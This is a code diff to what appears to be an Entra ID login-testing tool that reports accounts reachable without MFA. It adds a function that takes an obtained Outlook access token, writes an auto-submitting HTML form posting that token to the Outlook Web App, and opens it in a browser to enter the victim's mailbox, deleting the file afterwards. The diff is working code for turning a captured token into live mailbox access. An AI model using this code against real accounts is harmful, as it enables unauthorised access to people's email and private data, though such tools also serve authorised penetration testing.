@@ -70,6 +70,29 @@ def tryEntraLogin(lstData, resource = None, client = None, boolVerbose = False):
         exit()
     else: return jResp
 
+def launchOWA(sToken):
+    import webbrowser, os, time
+    print('[+] Launching default browser into Outlook using the provided token')
+    time.sleep(2)
+    sCurPath = os.path.dirname(os.path.realpath(__file__))
+    sTempHTMLFile = 'LaunchOWA-DeadBeat.html'
+    sHTMLContent = r'''
+    <html><body onload="document.forms[0].submit()">
+        <form name="outlook_form" action="https://outlook.office365.com/owa/" method="POST" target="_parent">
+            <textarea type="text" name="id_token">{}</textarea>
+            <input name="code" value="anything">
+            <button type="submit">Open outlook</button>
+        </form></body>
+    </html>
+    '''.format(sToken)
+    f = open(sTempHTMLFile, 'w')
+    f.write(sHTMLContent)
+    f.close()
+    webbrowser.open(r'file://{}'.format(os.path.join(sCurPath,sTempHTMLFile)))
+    time.sleep(5)
+    os.remove(sTempHTMLFile)
+    return
+
 def showData(jResp, boolShowTips):
     def getResource(sAud): return list(WELLKNOWN_RESOURCES.keys())[list(WELLKNOWN_RESOURCES.values()).index(sAud)]
     sAccessToken = jResp['access_token']
@@ -85,6 +108,9 @@ def showData(jResp, boolShowTips):
     sOID = jJWT['oid']
     if not boolShowTips:
         print(f'[+] Successfully authenticated without MFA, for more details: rerun with options "-r {sResource} -s"')
+    if 'outlook' in sResource.lower():
+        sAns = input('[?] Detected valid token for MS Outlook O365, launch browser into mailbox? [Y/n]: ')
+        if not 'n' in sAns.lower(): launchOWA(sAccessToken)
     print(f'[+] Account:        {sUPN}')
     print(f'    Tenant ID:      {sTenantID}')
     print(f'    Account ID/OID: {sOID}')
